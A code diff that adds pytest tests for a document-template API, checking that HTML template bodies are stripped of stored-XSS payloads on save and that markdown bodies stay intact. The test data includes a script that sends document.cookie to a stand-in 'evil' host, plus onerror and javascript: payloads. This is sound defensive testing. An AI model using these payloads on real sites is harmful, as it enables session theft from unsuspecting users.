@@ -354,6 +354,81 @@ async def test_get_content_binary_template_415(client: AsyncClient, admin_alice:
     assert res.status_code == 415, res.text
 
 
+# ── Stored XSS sanitisation on save (audit 2026-06-22 #2) ───────────────
+#
+# Templates are development/tenant-shared resources; an HTML body saved by
+# one user is auto-previewed (dangerouslySetInnerHTML) in another staff
+# member's authenticated session. The save endpoint strips the
+# XSS-dangerous subset (script/iframe, on* handlers, javascript: URIs) from
+# text/html bodies before persisting, so the stored bytes can never carry
+# an active payload. Benign layout markup is preserved untouched.
+
+
+@pytest.mark.asyncio
+async def test_save_text_html_strips_xss_payload(client: AsyncClient, admin_alice: dict) -> None:
+    """A malicious HTML body is sanitised on save — round-tripped content
+    must not contain <script>, an onerror handler, or a javascript: URL."""
+    evil = (
+        "<h1>Quote for {{buyer.full_name}}</h1>"
+        "<script>fetch('//evil/?c='+document.cookie)</script>"
+        '<img src=x onerror="alert(1)">'
+        '<a href="javascript:alert(2)">click</a>'
+    )
+    save = await client.post(
+        "/api/v1/property-dev/document-templates/save-text",
+        json={
+            "name": "XSS attempt",
+            "doc_type": "custom",
+            "entity": "custom",
+            "content_type": "text/html",
+            "content_text": evil,
+            "project_id": admin_alice["project_id"],
+        },
+        headers=admin_alice["headers"],
+    )
+    assert save.status_code == 201, save.text
+    template_id = save.json()["id"]
+
+    fetched = await client.get(
+        f"/api/v1/property-dev/document-templates/custom/{template_id}/content",
+        headers=admin_alice["headers"],
+    )
+    assert fetched.status_code == 200, fetched.text
+    stored = fetched.json()["content_text"].lower()
+    assert "<script" not in stored
+    assert "onerror" not in stored
+    assert "javascript:" not in stored
+    # Benign heading + placeholder survive so the template stays usable.
+    assert "quote for" in stored
+    assert "{{buyer.full_name}}" in fetched.json()["content_text"]
+
+
+@pytest.mark.asyncio
+async def test_save_text_markdown_body_not_mangled(client: AsyncClient, admin_alice: dict) -> None:
+    """Markdown bodies are escaped at render time, so the save path must
+    leave them byte-for-byte intact (only text/html is HTML-stripped)."""
+    md = "# Title\n\nUse <brackets> and `code` and **bold** here.\n"
+    save = await client.post(
+        "/api/v1/property-dev/document-templates/save-text",
+        json={
+            "name": "MD intact",
+            "doc_type": "custom",
+            "entity": "custom",
+            "content_type": "text/markdown",
+            "content_text": md,
+            "project_id": admin_alice["project_id"],
+        },
+        headers=admin_alice["headers"],
+    )
+    assert save.status_code == 201, save.text
+    fetched = await client.get(
+        f"/api/v1/property-dev/document-templates/custom/{save.json()['id']}/content",
+        headers=admin_alice["headers"],
+    )
+    assert fetched.status_code == 200, fetched.text
+    assert fetched.json()["content_text"] == md
+
+
 # ── Filename / extension safety ────────────────────────────────────────
 
 
